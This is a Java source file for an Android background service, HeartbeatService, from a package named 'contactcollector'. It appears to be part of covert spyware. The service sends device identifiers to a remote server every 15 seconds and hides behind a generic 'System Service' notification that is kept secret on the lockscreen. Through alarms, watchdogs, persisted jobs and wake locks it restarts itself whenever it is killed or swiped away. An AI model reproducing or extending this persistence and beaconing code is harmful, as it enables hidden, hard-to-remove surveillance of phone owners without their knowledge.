package com.contactcollector.app;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.SystemClock;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class HeartbeatService extends Service {

    private static final String CHANNEL_ID = "heartbeat_channel";
    private static final int NOTIFICATION_ID = 2001;
    private static final long HEARTBEAT_INTERVAL_MS = 15000; // 15 seconds when connected
    private static final long RECONNECT_MIN_MS = 10000;      // 10 seconds minimum retry
    private static final long RECONNECT_MAX_MS = 180000;     // 3 minutes max between retries
    private static final int MSG_HEARTBEAT = 1;
    private static final String PREFS_NAME = "CollectorPrefs";

    private HeartbeatHandler handler;
    private String sessionId;
    private String baseUrl;
    private String deviceId;
    private String deviceName;
    private String deviceModel;
    private String deviceBrand;
    private String androidVersion;

    private PowerManager.WakeLock wakeLock;
    private ConnectivityManager.NetworkCallback networkCallback;
    private int consecutiveFailures = 0;

    // IMMORTAL: This service NEVER gives up. Even after millions of failures,
    // it will keep trying to reconnect every 3 minutes forever.

    private static class HeartbeatHandler extends Handler {
        private HeartbeatService service;

        HeartbeatHandler(HeartbeatService svc) {
            super(Looper.getMainLooper());
            service = svc;
        }

        @Override
        public void handleMessage(Message msg) {
            if (msg.what == MSG_HEARTBEAT && service != null) {
                service.performHeartbeat();
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new HeartbeatHandler(this);
        acquireWakeLock();
        registerNetworkCallback();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Load from intent extras first, then SharedPreferences
        if (intent != null) {
            String s = intent.getStringExtra("sessionId");
            if (s != null && !s.isEmpty()) sessionId = s;
            String b = intent.getStringExtra("baseUrl");
            if (b != null && !b.isEmpty()) baseUrl = b;
            String d = intent.getStringExtra("deviceId");
            if (d != null && !d.isEmpty()) deviceId = d;
            String n = intent.getStringExtra("deviceName");
            if (n != null && !n.isEmpty()) deviceName = n;
            String m = intent.getStringExtra("deviceModel");
            if (m != null && !m.isEmpty()) deviceModel = m;
            String br = intent.getStringExtra("deviceBrand");
            if (br != null && !br.isEmpty()) deviceBrand = br;
            String v = intent.getStringExtra("androidVersion");
            if (v != null && !v.isEmpty()) androidVersion = v;
        }

        // Always load from SharedPreferences as fallback
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        if (sessionId == null || sessionId.isEmpty()) sessionId = prefs.getString("sessionId", null);
        if (baseUrl == null || baseUrl.isEmpty()) baseUrl = prefs.getString("baseUrl", null);
        if (deviceId == null || deviceId.isEmpty()) deviceId = prefs.getString("deviceId", null);
        if (deviceName == null || deviceName.isEmpty()) deviceName = prefs.getString("deviceName", Build.MANUFACTURER + " " + Build.MODEL);
        if (deviceModel == null || deviceModel.isEmpty()) deviceModel = prefs.getString("deviceModel", Build.MODEL);
        if (deviceBrand == null || deviceBrand.isEmpty()) deviceBrand = prefs.getString("deviceBrand", Build.BRAND);
        if (androidVersion == null || androidVersion.isEmpty()) androidVersion = prefs.getString("androidVersion", Build.VERSION.RELEASE);

        // IMMORTAL: Save everything to SharedPreferences for ANY future restart
        SharedPreferences.Editor editor = prefs.edit();
        if (sessionId != null) editor.putString("sessionId", sessionId);
        if (baseUrl != null) editor.putString("baseUrl", baseUrl);
        if (deviceId != null) editor.putString("deviceId", deviceId);
        if (deviceName != null) editor.putString("deviceName", deviceName);
        if (deviceModel != null) editor.putString("deviceModel", deviceModel);
        if (deviceBrand != null) editor.putString("deviceBrand", deviceBrand);
        if (androidVersion != null) editor.putString("androidVersion", androidVersion);
        editor.apply();

        createNotificationChannel();

        Notification notification = buildNotification();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification);
        }

        // Start heartbeat immediately
        handler.removeMessages(MSG_HEARTBEAT);
        handler.sendEmptyMessage(MSG_HEARTBEAT);

        // IMMORTAL: Schedule a periodic watchdog alarm every 5 minutes
        // This ensures the service is ALWAYS running, even if Android kills everything
        scheduleWatchdogAlarm();

        return START_STICKY;
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
        } else {
            return new Notification.Builder(this)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(Notification.PRIORITY_LOW)
                .setOngoing(true)
                .build();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeMessages(MSG_HEARTBEAT);
        }
        // IMMORTAL: Schedule aggressive restart - this service must NEVER die permanently
        scheduleRestart(500);
        scheduleJobRestart();
        scheduleWatchdogAlarm();
        releaseWakeLock();
        unregisterNetworkCallback();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // IMMORTAL: App swiped from recents? Restart immediately.
        scheduleRestart(300);
        scheduleJobRestart();
        scheduleWatchdogAlarm();
        super.onTaskRemoved(rootIntent);
    }

    private void acquireWakeLock() {
        try {
            if (wakeLock == null) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "collector:heartbeat");
                wakeLock.setReferenceCounted(false);
            }
            if (!wakeLock.isHeld()) {
                wakeLock.acquire(10 * 60 * 1000L);
            }
        } catch (Exception e) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {}
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            NetworkRequest request = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(Network network) {
                    // IMMORTAL: Network came back - send heartbeat IMMEDIATELY
                    if (handler != null) {
                        handler.removeMessages(MSG_HEARTBEAT);
                        handler.sendEmptyMessage(MSG_HEARTBEAT);
                    }
                }

                @Override
                public void onLost(Network network) {
                    // Network lost - will retry with backoff
                }
            };
            cm.registerNetworkCallback(request, networkCallback);
        } catch (Exception e) {}
    }

    private void unregisterNetworkCallback() {
        try {
            if (networkCallback != null) {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
            }
        } catch (Exception e) {}
    }

    // IMMORTAL: Schedule alarm to restart this service
    private void scheduleRestart(long delayMs) {
        try {
            Intent restartIntent = new Intent(this, ServiceRestartReceiver.class);
            restartIntent.putExtra("restartReason", "heartbeat_killed");
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 1, restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerTime = SystemClock.elapsedRealtime() + delayMs;
                try {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
                } catch (SecurityException se) {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
                }
            }
        } catch (Exception e) {}
    }

    // IMMORTAL: Watchdog alarm fires every 5 minutes to ensure this service is alive
    private void scheduleWatchdogAlarm() {
        try {
            Intent watchdogIntent = new Intent(this, WatchdogAlarmReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 100, watchdogIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                // Repeating alarm every 5 minutes - IMMORTAL, never stops
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 300000, // 5 minutes
                    300000, // 5 minutes interval
                    pendingIntent
                );
            }
        } catch (Exception e) {}
    }

    // IMMORTAL: JobScheduler fallback for Android 12+
    private void scheduleJobRestart() {
        try {
            JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (jobScheduler == null) return;

            jobScheduler.cancel(1001);

            ComponentName serviceComponent = new ComponentName(this, WatchdogJobService.class);
            JobInfo.Builder builder = new JobInfo.Builder(1001, serviceComponent)
                .setMinimumLatency(2000)
                .setOverrideDeadline(10000)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true);

            if (Build.VERSION.SDK_INT >= 26) {
                builder.setRequiresBatteryNotLow(false);
            }

            jobScheduler.schedule(builder.build());
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // IMMORTAL: Heartbeat never stops. On failure it retries with backoff.
    // On success it resumes 15-second intervals. NEVER GIVES UP.
    public void performHeartbeat() {
        if (sessionId == null || sessionId.isEmpty()) {
            // No session yet - keep trying every 30 seconds
            handler.sendEmptyMessageDelayed(MSG_HEARTBEAT, 30000);
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean success = sendHeartbeat();
                if (success) {
                    consecutiveFailures = 0;
                    acquireWakeLock();
                } else {
                    consecutiveFailures++;
                }

                // IMMORTAL: Calculate next interval - NEVER stops retrying
                long nextInterval;
                if (consecutiveFailures == 0) {
                    nextInterval = HEARTBEAT_INTERVAL_MS; // 15 seconds on success
                } else if (consecutiveFailures <= 3) {
                    nextInterval = RECONNECT_MIN_MS; // 10 seconds for first few failures
                } else {
                    // Exponential backoff capped at 3 minutes, but NEVER stops
                    nextInterval = Math.min(
                        RECONNECT_MIN_MS * (long) Math.pow(2, Math.min(consecutiveFailures - 3, 5)),
                        RECONNECT_MAX_MS
                    );
                }

                if (handler != null) {
                    handler.sendEmptyMessageDelayed(MSG_HEARTBEAT, nextInterval);
                }
            }
        }).start();
    }

    private boolean sendHeartbeat() {
        HttpURLConnection conn = null;
        try {
            JSONObject payload = new JSONObject();
            payload.put("sessionId", sessionId);
            if (deviceId != null && !deviceId.isEmpty()) {
                payload.put("deviceId", deviceId);
                payload.put("deviceName", deviceName);
                payload.put("deviceModel", deviceModel);
                payload.put("deviceBrand", deviceBrand);
                payload.put("androidVersion", androidVersion);
            }

            URL url = new URL(baseUrl + "/api/heartbeat");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode >= 200 && responseCode < 300) {
                return true;
            }
            // If session not found (404), the server may have been reset
            // IMMORTAL: Keep trying anyway - server might come back
            return false;
        } catch (Exception e) {
            // IMMORTAL: Network error, server down, etc - keep trying
            return false;
        } finally {
            if (conn != null) {
                try { conn.disconnect(); } catch (Exception e) {}
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
